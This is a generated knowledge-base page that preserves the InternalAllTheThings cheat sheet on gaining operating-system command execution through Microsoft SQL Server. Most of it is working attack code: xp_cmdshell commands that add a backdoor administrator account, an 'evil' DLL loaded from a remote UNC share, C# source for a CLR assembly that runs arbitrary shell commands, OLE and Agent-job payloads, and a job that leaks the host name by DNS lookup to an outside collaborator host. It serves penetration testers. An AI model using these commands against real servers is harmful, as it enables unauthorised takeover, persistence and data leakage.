---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# MSSQL - Command Execution

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-databases-mssql-command-execution` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/databases/mssql-command-execution.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [MSSQL - Command Execution](../../topics/databases/mssql-command-execution.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-databases-mssql-command-execution |
| name | MSSQL - Command Execution |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/databases/mssql-command-execution.md |

## Preserved Source Material

````yaml
_body: "# MSSQL - Command Execution\n\n## Summary\n\n- [Command Execution via xp_cmdshell](#command-execution-via-xp_cmdshell)\n\
  - [Extended Stored Procedure](#extended-stored-procedure)\n    - [Add the extended stored procedure and list extended stored\
  \ procedures](#add-the-extended-stored-procedure-and-list-extended-stored-procedures)\n- [CLR Assemblies](#clr-assemblies)\n\
  \    - [Execute commands using CLR assembly](#execute-commands-using-clr-assembly)\n    - [Manually creating a CLR DLL and\
  \ importing it](#manually-creating-a-clr-dll-and-importing-it)\n- [OLE Automation](#ole-automation)\n    - [Execute commands\
  \ using OLE automation procedures](#execute-commands-using-ole-automation-procedures)\n- [Agent Jobs](#agent-jobs)\n   \
  \ - [Execute commands through SQL Agent Job service](#execute-commands-through-sql-agent-job-service)\n    - [List All Jobs](#list-all-jobs)\n\
  - [External Scripts](#external-scripts)\n    - [Python](#python)\n    - [R](#r)\n\n## Command Execution via xp_cmdshell\n\
  \n> xp_cmdshell disabled by default since SQL Server 2005\n\n```ps1\nPowerUpSQL> Invoke-SQLOSCmd -Username sa -Password\
  \ Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command whoami\n\n# Creates and adds local user backup to the local\
  \ administrators group:\nPowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\"\
  \ -Command \"net user backup Password1234 /add'\" -Verbose\nPowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234\
  \ -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"net localgroup administrators backup /add\" -Verbose\n```\n\n- Manually\
  \ execute the SQL query\n\n ```sql\n EXEC xp_cmdshell \"net user\";\n EXEC master..xp_cmdshell 'whoami'\n EXEC master.dbo.xp_cmdshell\
  \ 'cmd.exe dir c:';\n EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';\n ```\n\n- If you need to reactivate xp_cmdshell (disabled\
  \ by default in SQL Server 2005)\n\n ```sql\n EXEC sp_configure 'show advanced options',1;\n RECONFIGURE;\n EXEC sp_configure\
  \ 'xp_cmdshell',1;\n RECONFIGURE;\n ```\n\n- If the procedure was uninstalled\n\n ```sql\n sp_addextendedproc 'xp_cmdshell','xplog70.dll'\n\
  \ ```\n\n## Extended Stored Procedure\n\n### Add the extended stored procedure and list extended stored procedures\n\n```ps1\n\
  # Create evil DLL\nCreate-SQLFileXpDll -OutFile C:\\temp\\test.dll -Command \"echo test > c:\\temp\\test.txt\" -ExportName\
  \ xp_test\n\n# Load the DLL and call xp_test\nGet-SQLQuery -UserName sa -Password Password1234 -Instance \"<DBSERVERNAME\\\
  DBInstance>\" -Query \"sp_addextendedproc 'xp_test', '\\\\10.10.0.1\\temp\\test.dll'\"\nGet-SQLQuery -UserName sa -Password\
  \ Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Query \"EXEC xp_test\"\n\n# Listing existing\nGet-SQLStoredProcedureXP\
  \ -Instance \"<DBSERVERNAME\\DBInstance>\" -Verbose\n```\n\n- Build a DLL using [xp_evil_template.cpp](https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/xp_evil_template.cpp)\n\
  - Load the DLL\n\n ```sql\n -- can also be loaded from UNC path or Webdav\n sp_addextendedproc 'xp_calc', 'C:\\mydll\\xp_calc.dll'\n\
  \ EXEC xp_calc\n sp_dropextendedproc 'xp_calc'\n ```\n\n## CLR Assemblies\n\nPrerequisites:\n\n- sysadmin privileges\n-\
  \ CREATE ASSEMBLY permission (or)\n- ALTER ASSEMBLY permission (or)\n\nThe execution takes place with privileges of the\
  \ **service account**.\n\n### Execute commands using CLR assembly\n\n```ps1\n# Create C# code for the DLL, the DLL and SQL\
  \ query with DLL as hexadecimal string\nCreate-SQLFileCLRDll -ProcedureName \"runcmd\" -OutFile runcmd -OutDir C:\\Users\\\
  user\\Desktop\n\n# Execute command using CLR assembly\nInvoke-SQLOSCmdCLR -Username sa -Password <password> -Instance <instance>\
  \ -Command \"whoami\" -Verbose\nInvoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\"\
  \ -Command \"whoami\" Verbose\nInvoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\"\
  \ -Command \"powershell -e <base64>\" -Verbose\n\n# List all the stored procedures added using CLR\nGet-SQLStoredProcedureCLR\
  \ -Instance <instance> -Verbose\n```\n\n### Manually creating a CLR DLL and importing it\n\nCreate a C# DLL file with the\
  \ following content, with the command : `C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /target:library c:\\\
  temp\\cmd_exec.cs`\n\n```csharp\nusing System;\nusing System.Data;\nusing System.Data.SqlClient;\nusing System.Data.SqlTypes;\n\
  using Microsoft.SqlServer.Server;\nusing System.IO;\nusing System.Diagnostics;\nusing System.Text;\n\npublic partial class\
  \ StoredProcedures\n{\n    [Microsoft.SqlServer.Server.SqlProcedure]\n    public static void cmd_exec (SqlString execCommand)\n\
  \    {\n        Process proc = new Process();\n        proc.StartInfo.FileName = @\"C:\\Windows\\System32\\cmd.exe\";\n\
  \        proc.StartInfo.Arguments = string.Format(@\" /C {0}\", execCommand.Value);\n        proc.StartInfo.UseShellExecute\
  \ = false;\n        proc.StartInfo.RedirectStandardOutput = true;\n        proc.Start();\n\n        // Create the record\
  \ and specify the metadata for the columns.\n        SqlDataRecord record = new SqlDataRecord(new SqlMetaData(\"output\"\
  , SqlDbType.NVarChar, 4000));\n        \n        // Mark the beginning of the result set.\n        SqlContext.Pipe.SendResultsStart(record);\n\
  \n        // Set values for each column in the row\n        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());\n\
  \n        // Send the row back to the client.\n        SqlContext.Pipe.SendResultsRow(record);\n        \n        // Mark\
  \ the end of the result set.\n        SqlContext.Pipe.SendResultsEnd();\n        \n        proc.WaitForExit();\n       \
  \ proc.Close();\n    }\n};\n```\n\nThen follow these instructions:\n\n1. Enable `show advanced options` on the server\n\n\
  \    ```sql\n    sp_configure 'show advanced options',1; \n    RECONFIGURE\n    GO\n    ```\n\n2. Enable CLR on the server\n\
  \n    ```sql\n    sp_configure 'clr enabled',1\n    RECONFIGURE\n    GO\n    ```\n\n3. Trust the assembly by adding its\
  \ SHA512 hash\n\n    ```sql\n    EXEC sys.sp_add_trusted_assembly 0x[SHA512], N'assembly';\n    ```\n\n4. Import the assembly\n\
  \n    ```sql\n    CREATE ASSEMBLY my_assembly\n    FROM 'c:\\temp\\cmd_exec.dll'\n    WITH PERMISSION_SET = UNSAFE;\n  \
  \  ```\n\n5. Link the assembly to a stored procedure\n\n    ```sql\n    CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR\
  \ (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];\n    GO\n    ```\n\n6. Execute and clean\n\n ```sql\n\
  \ cmd_exec \"whoami\"\n DROP PROCEDURE cmd_exec\n DROP ASSEMBLY my_assembly\n ```\n\n**CREATE ASSEMBLY** will also accept\
  \ an hexadecimal string representation of a CLR DLL\n\n```sql\nCREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM \n\
  0x4D5A90000300000004000000F[TRUNCATED]\nWITH PERMISSION_SET = UNSAFE \nGO \n```\n\n## OLE Automation\n\n- :warning: Disabled\
  \ by default\n- The execution takes place with privileges of the **service account**.\n\n### Execute commands using OLE\
  \ automation procedures\n\n```ps1\nInvoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\"\
  \ -Command \"whoami\" Verbose\n```\n\n```ps1\n# Enable OLE Automation\nEXEC sp_configure 'show advanced options', 1\nEXEC\
  \ sp_configure reconfigure\nEXEC sp_configure 'OLE Automation Procedures', 1\nEXEC sp_configure reconfigure\n\n# Execute\
  \ commands\nDECLARE @execmd INT\nEXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT\nEXEC SP_OAMETHOD @execmd, 'run', null,\
  \ '%systemroot%\\system32\\cmd.exe /c'\n```\n\n```powershell\n# https://github.com/blackarrowsec/mssqlproxy/blob/master/mssqlclient.py\n\
  python3 mssqlclient.py 'host/username:password@10.10.10.10' -install -clr Microsoft.SqlServer.Proxy.dll\npython3 mssqlclient.py\
  \ 'host/username:password@10.10.10.10' -check -reciclador 'C:\\windows\\temp\\reciclador.dll'\npython3 mssqlclient.py 'host/username:password@10.10.10.10'\
  \ -start -reciclador 'C:\\windows\\temp\\reciclador.dll'\nSQL> enable_ole\nSQL> upload reciclador.dll C:\\windows\\temp\\\
  reciclador.dll\n```\n\n## Agent Jobs\n\n- The execution takes place with privileges of the **SQL Server Agent service account**\
  \ if a proxy account is not configured.\n- :warning: Require **sysadmin** or **SQLAgentUserRole**, **SQLAgentReaderRole**,\
  \ and **SQLAgentOperatorRole** roles to create a job.\n\n### Execute commands through SQL Agent Job service\n\n```ps1\n\
  Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\"\
  \ -Command \"powershell e <base64encodedscript>\" -Verbose\nSubsystem Options:\n–Subsystem CmdExec\n-SubSystem PowerShell\n\
  –Subsystem VBScript\n–Subsystem Jscript\n```\n\n```sql\nUSE msdb; \nEXEC dbo.sp_add_job @job_name = N'test_powershell_job1';\
  \ \nEXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell',\
  \ @command = N'$name=$env:COMPUTERNAME[10];nslookup \"$name.redacted.burpcollaborator.net\"', @retry_attempts = 1, @retry_interval\
  \ = 5 ;\nEXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; \nEXEC dbo.sp_start_job N'test_powershell_job1';\n\
  \n-- delete\nEXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';\n```\n\n### List All Jobs\n\n```ps1\nSELECT job_id,\
  \ [name] FROM msdb.dbo.sysjobs;\nSELECT job.job_id, notify_level_email, name, enabled, description, step_name, command,\
  \ server, database_name FROM msdb.dbo.sysjobs job INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id = steps.job_id\nGet-SQLAgentJob\
  \ -Instance \"<DBSERVERNAME\\DBInstance>\" -username sa -Password Password1234 -Verbose\n```\n\n## External Scripts\n\n\
  Requirements:\n\n- Feature 'Advanced Analytics Extensions' must be installed\n- Enable **external scripts**.\n\n```sql\n\
  sp_configure 'external scripts enabled', 1;\nRECONFIGURE;\n```\n\n### Python\n\n```ps1\nInvoke-SQLOSCmdPython -Username\
  \ sa -Password Password1234 -Instance \"<DBSERVERNAME\\DBInstance>\" -Command \"powershell -e <base64encodedscript>\" -Verbose\n\
  \nEXEC sp_execute_external_script @language =N'Python',@script=N'import subprocess p = subprocess.Popen(\"cmd.exe /c whoami\"\
  , stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), \"utf-8\")])'\nWITH RESULT SETS (([cmd_out]\
  \ nvarchar(max)))\n```\n\n### R\n\n```ps1\nInvoke-SQLOSCmdR -Username sa -Password Password1234 -Instance \"<DBSERVERNAME\\\
  DBInstance>\" -Command \"powershell -e <base64encodedscript>\" -Verbose\n\nEXEC sp_execute_external_script @language=N'R',@script=N'OutputDataSet\
  \ <- data.frame(system(\"cmd.exe /c dir\",intern=T))'\nWITH RESULT SETS (([cmd_out] text));\nGO\n\n@script=N'OutputDataSet\
  \ <-data.frame(shell(\"dir\",intern=T))'\n```\n\n## References\n\n- [Attacking SQL Server CLR Assemblies - Scott Sutherland\
  \ - July 13th, 2017](https://blog.netspi.com/attacking-sql-server-clr-assemblies/)\n- [MSSQL Agent Jobs for Command Execution\
  \ - Nicholas Popovich - September 21, 2016](https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution)"
_relative_path: databases/mssql-command-execution.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/databases/mssql-command-execution.md
````
